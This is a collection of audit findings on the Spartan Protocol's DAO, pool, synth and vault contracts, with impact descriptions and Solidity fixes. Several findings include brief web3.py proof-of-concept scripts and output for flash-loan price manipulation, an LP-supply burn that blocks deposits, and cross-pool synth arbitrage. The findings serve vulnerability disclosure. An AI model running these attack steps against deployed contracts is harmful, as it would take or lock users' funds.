# Handle  hickuphh3   # Vulnerability details  ### Impact  `depositLPForMember()` and `bond()` invokes `harvest()` if a user has existing LP deposits or bonded assets into the DAO. This is to prevent users from depositing more assets before calling `harvest()` to earn more DAOVault incentives. However, `harvest()` reverts if reserve emissions are turned off.   Hence, deposits / bonds performed by existing users will fail should reserve emissions be disabled.  ### Recommended Mitigation Steps  Cache claimable rewards into a separate mapping when `depositLPForMember()` and `bond()` are called. `harvest()` will then attempt to claim these cached + pending rewards. Perhaps Synthetix's Staking Rewards contract or Sushiswap's FairLaunch contract can provide some inspiration.  
# Handle  hickuphh3   # Vulnerability details  ### Impact  In general, creating invalid proposals is easy due to the lack of validation in the `new*Proposal()` functions.  - The `typeStr` is not validated at all. For example, one can call `newActionProposal()` with `typeStr = ROUTER` or `typeStr = BAD_STRING`, both of which will pass. The first will cause `finaliseProposal()` to fail because the proposed address is null, preventing `completeProposal()` from executing. The second does nothing because it does not equate to any of the check `typeStr`, and so `completeProposal()` isn't executed at all. - Not checking the proposed values are null. The checks only happen in `finaliseProposal()` when the relevant sub-functions are called, like the `move*()` functions.  All of these scenarios lead to a mandatory 15 day wait since proposal creation in order to be cancelled, which prevents the creation of new proposals (in order words, denial of service of the DAO).  ### Recommended Mitigation Steps  1. Since the number of proposal types is finite, it is best to restrict and validate the `typeStr` submitted. Specifically,     - `newActionProposal()` should only allow `FLIP_EMISSIONS` and `GET_SPARTA` proposal types     - `newAddressProposal()` should only allow `DAO`, `ROUTER`, `UTILS`, `RESERVE`, `LIST_BOND`, `DELIST_BOND`, `ADD_CURATED_POOL` and  `REMOVE_CURATED_POOL` proposal types     - `newParamProposal()` should only allow `COOL_OFF` and `ERAS_TO_EARN` proposal types 2. Perhaps have a "catch-all-else" proposal that will only call `_completeProposal()` in `finaliseProposal()`  ```jsx function finaliseProposal() external {  ...  } else if (isEqual(_type, 'ADD_CURATED_POOL')){   _addCuratedPool(currentProposal);   } else if (isEqual(_type, 'REMOVE_CURATED_POOL')){     _removeCuratedPool(currentProposal);   } else {   completeProposal(_proposalID);  } } ```  3. Do null validation checks in `newAddressProposal()` and `newParamProposal()`  ```jsx function newAddressProposal(address proposedAddress, string memory typeStr) external returns(uint) {     require(proposedAddress != address(0), "!address");   // TODO: validate typeStr   ... }  function newParamProposal(uint32 param, string memory typeStr) external returns(uint) {     require(param != 0, "!param");   // TODO: validate typeStr   ... } ```  
# Handle  hickuphh3   # Vulnerability details  ### Impact  A host of problems arise from the L110-113 of the `claimForMember()` function, where `_claimable` is deducted from the bondedLP balance before the condition check, when it should be performed after (or the condition is changed to checking if the remaining bondedLP balance to zero).  ```jsx // L110 - L113 mapBondAsset_memberDetails[asset].bondedLP[member] -= _claimable; // Remove the claim amount from the user's remainder if(_claimable == mapBondAsset_memberDetails[asset].bondedLP[member]){  mapBondAsset_memberDetails[asset].claimRate[member] = 0; // If final claim; zero-out their claimRate } ```  **1. Permanently Locked Funds**  If a user claims his bonded LP asset by calling `dao.claimForMember()`, or a malicious attacker helps a user to claim by calling `dao.claimAllForMember()`, either which is done such that `_claimable` is exactly half of his remaining bondedLP funds of an asset, then the other half would be permanently locked.  - Assume `mapBondAsset_memberDetails[asset].bondedLP[member] = 2 * _claimable` - L110: `mapBondAsset_memberDetails[asset].bondedLP[member] = _claimable` - L111: The if condition is satisfied - L112: User's claimRate is erroneously set to 0 ⇒ `calcBondedLP()` will return 0, ie. funds are locked permanently  **2. Claim Rate Never Zeroes For Final Claim**   On the flip side, should a user perform a claim that enables him to perform a full withdrawal (ie. `_claimable` = `mapBondAsset_memberDetails[asset].bondedLP[member]`, we see the following effects:  - L110: `mapBondAsset_memberDetails[asset].bondedLP[member] = 0` - L111: The if condition is not satisfied, L112 does not execute, so the member's claimRate for the asset remains non-zero (it is expected to have been set to zero).  Thankfully, subsequent behaviour remains as expected since `calcBondedLP` returns zero as `claimAmount` is set to the member's bondedLP balance (which is zero after a full withdrawal).  ### Recommended Mitigation Steps  The `_claimable` deduction should occur after the condition check. Alternatively, change the condition check to `if (mapBondAsset_memberDetails[asset].bondedLP[member] == 0)`.  
# Handle  jonah1005   # Vulnerability details  ## Impact Synth `realise` function calculates `baseValueLP` and `baseValueSynth` base on AMM spot price which is vulnerable to flash loan attack. Synth's lp is subject to `realise` whenever the AMM ratio is different than Synth's debt ratio.   The attack is not necessarily required flash loan. Big whale of the lp token holders could keep calling realse by shifting token ratio of AMM pool back and forth.   ## Proof of Concept The vulnerability locates at: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L187-L199  Where the formula here is dangerous: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L114-L126  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L210-L217 Here's a script for conducting flashloan attack ```python flashloan_amount = init_amount user = w3.eth.accounts[0] marked_token.functions.transfer(user, flashloan_amount).transact() marked_token.functions.transfer(token_pool.address, flashloan_amount).transact({'from': user}) token_pool.functions.addForMember(user).transact({'from': user}) received_lp = token_pool.functions.balanceOf(user).call()  synth_balance_before_realise = token_synth.functions.mapSynth_LPBalance(token_pool.address).call() token_synth.functions.realise(token_pool.address).transact() token_pool.functions.transfer(token_pool.address, received_lp).transact({'from': user}) token_pool.functions.removeForMember(user).transact({'from': user}) token_synth.functions.realise(token_pool.address).transact() synth_balance_after_realise = token_synth.functions.mapSynth_LPBalance(token_pool.address).call() print('synth_lp_balance_after_realise', synth_balance_after_realise) print('synth_lp_balance_before_realise', synth_balance_before_realise)  ``` Output: ``` synth_balance_after_realise 1317859964829313908162 synth_balance_before_realise 2063953488372093023256 ``` ## Tools Used None  ## Recommended Mitigation Steps Calculating Lp token's value base on AMM protocol is known to be dangerous. There are a few steps that might solve the issue: 1. calculate token's price from a reliable source.  Implement a TWAP oracle or uses chainlink oracle. 2. calculate lp token value based on anti-flashloan formula.  Alpha finance's formula is a good reference: https://blog.alphafinance.io/fair-lp-token-pricing   
# Handle  jonah1005   # Vulnerability details  ## Impact  `Pool` allows users to burn lp tokens without withdrawing the tokens. This allows the hacker to mutate the pools' rate to a point that no one can get any lp token anymore (even if depositing token).  The liquidity tokens are calculated at `Utils:calcLiquidityUnits` ```             // units = ((P (t B + T b))/(2 T B)) * slipAdjustment             // P * (part1 + part2) / (part3) * slipAdjustment             uint slipAdjustment = getSlipAdustment(b, B, t, T);             uint part1 = t*(B);             uint part2 = T*(b);             uint part3 = T*(B)*(2);             uint _units = (P * (part1 + (part2))) / (part3);             return _units * slipAdjustment / one;  // Divide by 10**18 ``` where `P` stands for `totalSupply` of current Pool. If `P` is too small (e.g, 1) then all the units would be rounding to 0.  Since any person can create a `Pool` at `PoolFactory`, hackers can create a Pool and burn his lp and set `totalSupply` to 1. He will be the only person who owns the Pool's lp from now on.  ## Proof of Concept Pool's burn logic: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L146  Utils' lp token formula: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L80  Here's a script of a user depositing 1M token to a pool where `totalSupply` equals 1  ``` dai_pool.functions.burn(init_amount-1).transact() print('total supply', dai_pool.functions.totalSupply().call()) dai.functions.transfer(dai_pool.address, 1000000 * 10**18).transact() dai_pool.functions.addForMember(user).transact() print('lp received from depositing 1M dai: ', dai_pool.functions.balanceOf(user).call()) ```  Output: ``` total supply 1 lp received from depositing 1M dai:  0 ``` ## Tools Used None ## Recommended Mitigation Steps Remove `burn` or restrict it to privileged users only.   
# Handle  hickuphh3   # Vulnerability details  ### Impact  The `claimAllForMember()` function iterates through the full list of `listedAssets`. Should `listedAssets` become too large, as more assets are listed, calling this function will run out of gas and fail.  ### Recommended Mitigation Steps  A good compromise would be to take in an array of asset indexes, so that users can claim for multiple assets in multiple parts.  ```jsx function claimAllForMember(address member, uint256[] calldata assetIndexes)  external returns (bool){         address [] memory listedAssets = listedBondAssets; // Get array of bond assets         for(uint i = 0; i < assetIndexes.length; i++){             uint claimA = calcClaimBondedLP(member, listedAssets[assetIndexes[i]]); // Check user's unlocked Bonded LPs for each asset             if(claimA > 0){                _BONDVAULT.claimForMember(listedAssets[assetIndexes[i]], member); // Claim LPs if any unlocked             }         }         return true;     } ```  
# Handle  hickuphh3   # Vulnerability details  ### Impact  In the case where `arrayFeeLength < arrayFeeSize`, totalTradeFees is not calculated, so normalAverageFee will be 0. Hence, a return statement can be added to exit the function. Otherwise, when `arrayFeeSize >= arrayFeeLength`, the feeArray elements are iterated through twice:  - First, in `addFee`, to shift the elements by 1 to make way for the new fee. Note that `addFee()` is also solely called by `addTradeFee()` - Second, for the calculation of totalTradeFees  With all these in mind, we can make the second iteration redundant by combining the total trade fee calculation in `addFee()`.  ### Recommended Mitigation Steps  ```jsx function addTradeFee(uint _fee) internal {  uint arrayFeeLength = feeArray.length;   if(arrayFeeLength < arrayFeeSize){   feeArray.push(_fee); // Build array until it is == arrayFeeSize     return;    }   // If array is required length; shift in place of oldest item   // Calculate totalTradeFee at the same time   uint totalTradeFees = addCurrentFeeAndCalcTotalTradeFees(arrayFeeLength, _fee);    normalAverageFee = totalTradeFees / arrayFeeSize; // Calc average fee }  function addCurrentFeeAndCalcTotalTradeFees(   uint arrayFeeLength,  uint _fee ) internal returns (uint totalTradeFees) {  totalTradeFees = _fee; // add newest fee   // store and update in memory first, for gas optimization   uint[] memory _feeArray = feeArray;   for (uint i = arrayFeeLength - 1; i > 0; i--) {   _feeArray[i] = _feeArray[i - 1];     totalTradeFees += _feeArray[i];   }   _feeArray[0] = _fee;   feeArray = _feeArray; } ```  
# Handle  hickuphh3   # Vulnerability details  ### Impact  The current `changeArrayFeeSize` implementation deletes the entire feeArray (which is used to calculate normalAverageFee for dividends), resulting in having to rebuild the feeArray again.  It would be better to keep the feeArray as is if the `_size` is greater than the current feeArrayLength, or trim it otherwise, so that the calculation `normalAverageFee` has past trade fees to use and is therefore more accurate.  ### Recommended Mitigation Steps  ```jsx function changeArrayFeeSize(uint _size) external onlyDAO {  arrayFeeSize = _size;   // trim feeArray to match _size   if (_size < feeArray.length) {      uint[] memory tempFeeArray = new uint[](_size);      // copy feeArray for gas optimization      uint[] memory _feeArray = feeArray;    for (uint i = 0; i < _size; i++) {         tempFeeArray[i] = _feeArray[i];    }      feeArray = tempFeeArray;  }   // otherwise, keep feeArray unchanged } ```  
# Handle  hickuphh3   # Vulnerability details  ### Impact  For minting, burning of synths and swaps, the fee and output amounts are calculated separately via `calcSwapOutput` and `calcSwapFee`. To avoid rounding errors and duplicate calculations, it would be best to combine both of these functions and return both outputs at once.  For example, if we take `x = 60000, X = 73500, Y = 50321`, the actual swap fee should be `10164.57` and output `12451.6`. However, `calcSwapOutput` and `calcSwapFee` returns `10164` and `12451`, leaving 1 wei unaccounted for. This can be avoided by combining the calculations as suggested below. The fee and actual output will be `10164` and `12452` instead.  Functions that have to call `calcSwapOutput` within the contract (eg. `calcSwapValueInBaseWithPool`) should call this function as well, for calculation consistency.  In addition, calculations for both `calcSwapOutput` and `calcSwapFee` will phantom overflow if the input values become too large. (Eg. `x = 2^128, Y=2^128`). This can be avoided by the suggested implementation below using the FullMath library.  ### Recommended Mitigation Steps  ```jsx function calcSwapFeeAndOutput(uint x, uint X, uint Y) public pure returns (uint output, uint swapFee) {      uint xAddX = x + X;      uint rawOutput = FullMath.mulDiv(x, Y, xAddX);      swapFee = FullMath.mulDiv(rawOutput, x, xAddX);      output = rawOutput - swapFee; }  function calcSwapValueInBaseWithPool(address pool, uint amount) public view returns (uint _output){        uint _baseAmount = iPOOL(pool).baseAmount();        uint _tokenAmount = iPOOL(pool).tokenAmount();        (_output, ) = calcSwapFeeAndOutput(amount, _tokenAmount, _baseAmount); } ```  The FullMath library is included (and made compatible with sol 0.8+) below for convenience.  ```jsx // SPDX-License-Identifier: MIT pragma solidity >= 0.8.0;  /// @title Contains 512-bit math functions /// @notice Facilitates multiplication and division that can have overflow of an intermediate value without any loss of precision /// @dev Handles "phantom overflow" i.e., allows multiplication and division where an intermediate value overflows 256 bits library FullMath {     /// @notice Calculates floor(a×b÷denominator) with full precision. Throws if result overflows a uint256 or denominator == 0     /// @param a The multiplicand     /// @param b The multiplier     /// @param denominator The divisor     /// @return result The 256-bit result     /// @dev Credit to Remco Bloemen under MIT license https://xn--2-umb.com/21/muldiv     function mulDiv(         uint256 a,         uint256 b,         uint256 denominator     ) internal pure returns (uint256 result) {         // 512-bit multiply [prod1 prod0] = a * b         // Compute the product mod 2**256 and mod 2**256 - 1         // then use the Chinese Remainder Theorem to reconstruct         // the 512 bit result. The result is stored in two 256         // variables such that product = prod1 * 2**256 + prod0         uint256 prod0; // Least significant 256 bits of the product         uint256 prod1; // Most significant 256 bits of the product         assembly {             let mm := mulmod(a, b, not(0))             prod0 := mul(a, b)             prod1 := sub(sub(mm, prod0), lt(mm, prod0))         }          // Handle non-overflow cases, 256 by 256 division         if (prod1 == 0) {             require(denominator > 0, "0 denom");             assembly {                 result := div(prod0, denominator)             }             return result;         }          // Make sure the result is less than 2**256.         // Also prevents denominator == 0         require(denominator > prod1, "denom <= prod1");          ///////////////////////////////////////////////         // 512 by 256 division.         ///////////////////////////////////////////////          // Make division exact by subtracting the remainder from [prod1 prod0]         // Compute remainder using mulmod         uint256 remainder;         assembly {             remainder := mulmod(a, b, denominator)         }         // Subtract 256 bit number from 512 bit number         assembly {             prod1 := sub(prod1, gt(remainder, prod0))             prod0 := sub(prod0, remainder)         }          // Factor powers of two out of denominator         // Compute largest power of two divisor of denominator.         // Always >= 1.         uint256 twos = denominator & (~denominator + 1);         // Divide denominator by power of two         assembly {             denominator := div(denominator, twos)         }          // Divide [prod1 prod0] by the factors of two         assembly {             prod0 := div(prod0, twos)         }         // Shift in bits from prod1 into prod0. For this we need         // to flip `twos` such that it is 2**256 / twos.         // If twos is zero, then it becomes one         assembly {             twos := add(div(sub(0, twos), twos), 1)         }         unchecked {             prod0 |= prod1 * twos;                          // Invert denominator mod 2**256             // Now that denominator is an odd number, it has an inverse             // modulo 2**256 such that denominator * inv = 1 mod 2**256.             // Compute the inverse by starting with a seed that is correct             // correct for four bits. That is, denominator * inv = 1 mod 2**4             uint256 inv = (3 * denominator) ^ 2;                          // Now use Newton-Raphson iteration to improve the precision.             // Thanks to Hensel's lifting lemma, this also works in modular             // arithmetic, doubling the correct bits in each step.             inv *= 2 - denominator * inv; // inverse mod 2**8             inv *= 2 - denominator * inv; // inverse mod 2**16             inv *= 2 - denominator * inv; // inverse mod 2**32             inv *= 2 - denominator * inv; // inverse mod 2**64             inv *= 2 - denominator * inv; // inverse mod 2**128             inv *= 2 - denominator * inv; // inverse mod 2**256                          // Because the division is now exact we can divide by multiplying             // with the modular inverse of denominator. This will give us the             // correct result modulo 2**256. Since the precoditions guarantee             // that the outcome is less than 2**256, this is the final result.             // We don't need to compute the high bits of the result and prod1             // is no longer required.             result = prod0 * inv;         }         return result;     } } ```  
# Handle  jonah1005   # Vulnerability details  ## Impact `approveAndCall` approve max allowance to the receiver regardless of the given parameter.  This is far away from what the function name implies. Users would lose all the tokens by using this function.  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L118 https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L113 ## Tools Used None ## Recommended Mitigation Steps Change to `_approve(msg.sender, recipient, amount); `  
# Handle  jonah1005   # Vulnerability details  ## Impact https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L46  The comment at `poolFactory` L46  is a bit misleading. ``` require(getPool(token) == address(0)); // Must be a valid token ```  A similar checks in `synthFactory` seems to be more clear. https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthFactory.sol#L38  ```         require(getSynth(token) == address(0), "exists"); // Synth must not already exist ```  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L46 ## Tools Used None ## Recommended Mitigation Steps  It seems that `PoolFactory` is the only contract that does not provide detailed revert messages. I wonder whether the devs do this because of the concern about the code size limit. If that's the case, I recommend refactoring it to libraries or even uses a proxy factory to create new pools.   Ref to proxy factory:  https://eips.ethereum.org/EIPS/eip-1167  
# Handle  hickuphh3   # Vulnerability details  ### Impact  In the `_approve` function, if the allowance passed in is `type(uint256).max`, nothing happens (ie. allowance will still remain at previous value). Contract integrations (DEXes for example) tend to hardcode this value to set maximum allowance initially, but this will result in zero allowance given instead.  This also makes the comment `// No need to re-approve if already max` misleading, because the max allowance attainable is `type(uint256).max - 1`, and re-approval does happen in this case.  This affects the `approveAndCall` implementation since it uses `type(uint256).max` as the allowance amount, but the resulting allowance set is zero.  ### Recommended Mitigation Steps  Keep it simple, remove the condition.  ```jsx function _approve(address owner, address spender, uint256 amount) internal virtual {         require(owner != address(0), "!owner");         require(spender != address(0), "!spender");         _allowances[owner][spender] = amount;         emit Approval(owner, spender, amount);     } ```  
# Handle  hickuphh3   # Vulnerability details  ### Impact  2 conditions enable the `DEPLOYER` to drain the funds in the DAOVault.  - `DAOVault` is missing `purgeDeployer()` function - `onlyDAO()` is callable by both the `DAO` and the `DEPLOYER`  The `DEPLOYER` can, at any time, call `depositLP()` to increase the LP funds of any account, then call `withdraw()` to withdraw the entire balance.  The only good use case for the `DEPLOYER` here is to help perform emergency withdrawals for users. However, this could use a separate modifier, like `onlyDeployer()`.  ### Proof of Concept  1. `DEPLOYER` calls `depositLP()` with any arbitrary amount (maybe DAOVault's pool LP balance - Alice's deposited LP balance) for Alice and pool to increase their weight and balance. 2. At this point, Alice may vote for a proposal to swing it in her favour, or remove it otherwise (to implicitly vote against it) 3. `DEPLOYER` calls `withdraw()` for the Alice, which removes 100% of her balance (and therefore, the entire DAOVault's pool balance)  ### Recommended Mitigation Steps  - Create a separate role and modifier for the `DEPLOYER`, so that he is only able to call `withdraw()` but not `depositLP()` - Include the missing `purgeDeployer()` function.  
# Handle  gpersoon   # Vulnerability details  ## Impact The function depositForMember of BondVault.sol adds user to the array arrayMembers. However it does this for each asset that a user deposits. Suppose a user deposit multiple assets, than the user is added multiple times to the array arrayMembers.  This will mean the memberCount() doesn't show accurate results. Also allMembers() will contain duplicate members  ## Proof of Concept // https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/BondVault.sol#L60 function depositForMember(address asset, address member, uint LPS) external onlyDAO returns(bool){         if(!mapBondAsset_memberDetails[asset].isMember[member]){             mapBondAsset_memberDetails[asset].isMember[member] = true; // Register user as member (scope: user -> asset)             arrayMembers.push(member); // Add user to member array (scope: vault)             mapBondAsset_memberDetails[asset].members.push(member); // Add user to member array (scope: user -> asset)         }        ...      // Get the total count of all existing & past BondVault members     function memberCount() external view returns (uint256 count){         return arrayMembers.length;     }     function allMembers() external view returns (address[] memory _allMembers){         return arrayMembers;     }  ## Tools Used  ## Recommended Mitigation Steps Use a construction like this: mapping(address => bool) isMember;    if(!isMember[member]){             isMember[member] = true;             arrayMembers.push(member);     }               
# Handle  jonah1005   # Vulnerability details  ## Impact `Pool` can mint arbitrary `Sythn` provided as long as it's a valid synth. When there are multiple curated pools and synth (which the protocol is designed for), hackers can mint expensive synthetics from a cheaper AMM pool. The hacker can burn the minted synth at the expensive pool and get profit. The arbitrage profit can be amplified with flash loan services and break all the pegs.  ## Proof of Concept Pool's mintSynth logic: https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Pool.sol#L229-L242  Synth's mintSynth logic: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L165-L171  Synth's authorization logic: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L229-L242   The price of the synthetics to be mint is calculated in `Pool` based on the AMM price of the current Pool   Here's a web3.py script of minting arbitrary Synth in a pool. For simplicity, two pools are set with the assumption that link is 10x expensive than dai.  ```python sparta_amount = 100 * 10**18 initail_link_synth = link_synth.functions.balanceOf(user).call() base.functions.transfer(link_pool.address, sparta_amount).transact({'from': user}) link_pool.functions.mintSynth(link_synth.address, user).transact({'from': user}) after_link_synth = link_synth.functions.balanceOf(user).call()  print('get link synth amount from link pool:', after_link_synth - initail_link_synth)  sparta_amount = 100 * 10**18 initail_link_synth = link_synth.functions.balanceOf(user).call() base.functions.transfer(dai_pool.address, sparta_amount).transact({'from': user}) dai_pool.functions.mintSynth(link_synth.address, user).transact({'from': user}) after_link_synth = link_synth.functions.balanceOf(user).call()  print('get link synth amount from dai pool:', after_link_synth - initail_link_synth)  ```  The log of the above script ``` get link synth amount from link pool: 97078046905036524413 get link synth amount from dai pool: 970780469050365244136 ``` ## Tools Used  Hardhat  ## Recommended Mitigation Steps Checks the provided synth's underlying token in `mintSynth`  `require(iSYNTH(synthOut).LayerONE() == TOKEN, "invalid synth");`    
# Handle  gpersoon   # Vulnerability details  ## Impact When the DAO is upgraded via moveDao, it also updates the DAO address in BASE. However it doesn't update the DAO address in the Reserve.sol contract. This could be done with the function setIncentiveAddresses(..)  Now the next time grantFunds of DAO.sol is called, its tries to call:  _RESERVE.grantFunds(...)  The grantFunds of Reserve.sol has the modifier onlyGrantor(), which checks the msg.sender == DAO. However in the mean time the DAO has been updated and Reserve.sol doesn't know about it and thus the modifier will not allow access to the function. Thus grantFunds will revert.  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L452  function moveDao(uint _proposalID) internal {         address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address         require(_proposedAddress != address(0), "!address"); // Proposed address must be valid         DAO = _proposedAddress; // Change the DAO to point to the new DAO address         iBASE(BASE).changeDAO(_proposedAddress); // Change the BASE contract to point to the new DAO address         daoHasMoved = true; // Set status of this old DAO         completeProposal(_proposalID); // Finalise the proposal     }      function grantFunds(uint _proposalID) internal {         uint256 _proposedAmount = mapPID_param[_proposalID]; // Get the proposed SPARTA grant amount         address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed SPARTA grant recipient         require(_proposedAmount != 0, "!param"); // Proposed grant amount must be valid         require(_proposedAddress != address(0), "!address"); // Proposed recipient must be valid         _RESERVE.grantFunds(_proposedAmount, _proposedAddress); // Grant the funds to the recipient         completeProposal(_proposalID); // Finalise the proposal     }  // https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/outside-scope/Reserve.sol#L17   modifier onlyGrantor() {         require(msg.sender == DAO || msg.sender == ROUTER || msg.sender == DEPLOYER || msg.sender == LEND || msg.sender == SYNTHVAULT, "!DAO");         _;      }    function grantFunds(uint amount, address to) external onlyGrantor {       ....     }     function setIncentiveAddresses(address _router, address _lend, address _synthVault, address _Dao) external onlyGrantor {         ROUTER = _router;         LEND = _lend;         SYNTHVAULT = _synthVault;         DAO = _Dao;     }   ## Tools Used  ## Recommended Mitigation Steps Call setIncentiveAddresses(..) when a DAO upgrade is done.   
# Handle  gpersoon   # Vulnerability details  ## Impact A call to transferFrom or transfer is frequently done without checking the results. For certain ERC20 tokens, if insufficient tokens are present, no revert occurs but a result of "false" is returned. So its important to check this. If you don't you could mint tokens without have received sufficient tokens to do so. So you could loose funds.  Its also a best practice to check this. See below for example where the result isn't checked.  Note, in some occasions the result is checked (see below for examples).  ## Proof of Concept Highest risk: .\Dao.sol:                iBEP20(_token).transferFrom(msg.sender, address(this), _amount); // Transfer user's assets to Dao contract .\Pool.sol:               iBEP20(TOKEN).transfer(member, outputToken); // Transfer the TOKENs to user .\Pool.sol:               iBEP20(token).transfer(member, outputAmount); // Transfer the swap output to the selected user .\poolFactory.sol:   iBEP20(_token).transferFrom(msg.sender, _pool, _amount); .\Router.sol:           iBEP20(_fromToken).transfer(fromPool, iBEP20(_fromToken).balanceOf(address(this))); // Transfer TOKENs from ROUTER to fromPool .\Router.sol:           iBEP20(_token).transfer(_pool, iBEP20(_token).balanceOf(address(this))); // Transfer TOKEN to pool .\Router.sol:           iBEP20(_token).transferFrom(msg.sender, _pool, _amount); // Transfer TOKEN to pool .\Router.sol:           iBEP20(_token).transfer(_recipient, _amount); // Transfer TOKEN to recipient .\Synth.sol:             iBEP20(_token).transferFrom(msg.sender, address(this), _amount); // Transfer tokens in  less risky .\Router.sol:           iBEP20(fromPool).transferFrom(_member, fromPool, unitsInput); // Transfer LPs from user to the pool .\BondVault.sol:     iBEP20(_pool).transfer(member, _claimable); // Send claim amount to user .\Router.sol:           iBEP20(_pool).transferFrom(_member, _pool, units); // Transfer LPs to the pool .\Router.sol:           iBEP20(_pool).transferFrom(_member, _pool, units); // Transfer LPs to pool .\Router.sol:           iBEP20(fromSynth).transferFrom(msg.sender, _poolIN, inputAmount); // Transfer synth from user to pool .\Pool.sol:               iBEP20(synthIN).transfer(synthIN, _actualInputSynth); // Transfer SYNTH to relevant synth contract .\Router.sol:           iBEP20(WBNB).transfer(_pool, _amount); // Transfer WBNB from ROUTER to pool .\Dao.sol:               iBEP20(BASE).transfer(newDAO, baseBal); .\Pool.sol:               iBEP20(BASE).transfer(member, outputBase); // Transfer the SPARTA to user .\Pool.sol:               iBEP20(BASE).transfer(member, outputBase); // Transfer SPARTA to user .\Router.sol:           iBEP20(BASE).transfer(toPool, iBEP20(BASE).balanceOf(address(this))); // Transfer SPARTA from ROUTER to toPool .\Router.sol:           iBEP20(BASE).transfer(_pool, iBEP20(BASE).balanceOf(address(this))); // Transfer SPARTA to pool .\Router.sol:           iBEP20(BASE).transfer(_pool, iBEP20(BASE).balanceOf(address(this))); // Transfer SPARTA from ROUTER to pool .\Router.sol:           iBEP20(BASE).transferFrom(msg.sender, _pool, inputAmount); // Transfer SPARTA from ROUTER to pool  Sometimes the result is checked: .\Dao.sol:              require(iBEP20(pool).transferFrom(msg.sender, address(_DAOVAULT), amount), "!funds"); // Send user's deposit to the DAOVault .\Dao.sol:              require(iBEP20(BASE).transferFrom(msg.sender, address(_RESERVE), _amount), '!fee'); // User pays the new proposal fee .\DaoVault.sol:      require(iBEP20(pool).transfer(member, _balance), "!transfer"); // Transfer user's balance to their wallet .\synthVault.sol:    require(iBEP20(synth).transferFrom(msg.sender, address(this), amount)); // Must successfuly transfer in .\synthVault.sol:    require(iBEP20(synth).transfer(msg.sender, redeemedAmount)); // Transfer from SynthVault to user  ## Tools Used grep  ## Recommended Mitigation Steps Always check the result of transferFrom and transfer   
# Handle  gpersoon   # Vulnerability details  ## Impact The function curatedPoolCount() contains a for loop over the array arrayPools. If arrayPools would be too big then the loop would run out of gas and curatedPoolCount() would revert. This would mean that addCuratedPool() cannot be executed anymore (because it calls curatedPoolCount() )  The array arrayPools can be increased in size arbitrarily by repeatedly doing the following: - create a pool with createPoolADD()  (which requires 10,000 SPARTA) - empty the pool with remove() of Pool.sol, which gives back the SPARTA tokens These actions will use gas to perform.  ## Proof of Concept //https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/poolFactory.sol#L45  function createPoolADD(uint256 inputBase, uint256 inputToken, address token) external payable returns(address pool){         require(getPool(token) == address(0)); // Must be a valid token         require((inputToken > 0 && inputBase >= (10000*10**18)), "!min"); // User must add at least 10,000 SPARTA liquidity & ratio must be finite         Pool newPool; address _token = token;         if(token == address(0)){_token = WBNB;} // Handle BNB -> WBNB         require(_token != BASE && iBEP20(_token).decimals() == 18); // Token must not be SPARTA & it's decimals must be 18         newPool = new Pool(BASE, _token); // Deploy new pool         pool = address(newPool); // Get address of new pool         mapToken_Pool[_token] = pool; // Record the new pool address in PoolFactory         _handleTransferIn(BASE, inputBase, pool); // Transfer SPARTA liquidity to new pool         _handleTransferIn(token, inputToken, pool); // Transfer TOKEN liquidity to new pool         arrayPools.push(pool); // Add pool address to the pool array        ..  function curatedPoolCount() internal view returns (uint){         uint cPoolCount;          for(uint i = 0; i< arrayPools.length; i++){             if(isCuratedPool[arrayPools[i]] == true){                 cPoolCount += 1;             }         }         return cPoolCount;     }   function addCuratedPool(address token) external onlyDAO {         ...         require(curatedPoolCount() < curatedPoolSize, "maxCurated"); // Must be room in the Curated list  //https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Pool.sol#L187   function remove() external returns (uint outputBase, uint outputToken) {         return removeForMember(msg.sender);     }       // Contract removes liquidity for the user     function removeForMember(address member) public returns (uint outputBase, uint outputToken) {         uint256 _actualInputUnits = balanceOf(address(this)); // Get the received LP units amount         outputBase = iUTILS(_DAO().UTILS()).calcLiquidityHoldings(_actualInputUnits, BASE, address(this)); // Get the SPARTA value of LP units         outputToken = iUTILS(_DAO().UTILS()).calcLiquidityHoldings(_actualInputUnits, TOKEN, address(this)); // Get the TOKEN value of LP units         _decrementPoolBalances(outputBase, outputToken); // Update recorded BASE and TOKEN amounts         _burn(address(this), _actualInputUnits); // Burn the LP tokens         iBEP20(BASE).transfer(member, outputBase); // Transfer the SPARTA to user         iBEP20(TOKEN).transfer(member, outputToken); // Transfer the TOKENs to user         emit RemoveLiquidity(member, outputBase, outputToken, _actualInputUnits);         return (outputBase, outputToken);     } ## Tools Used  ## Recommended Mitigation Steps Create a variable curatedPoolCount and increase it in addCuratedPool and decrease it in removeCuratedPool   
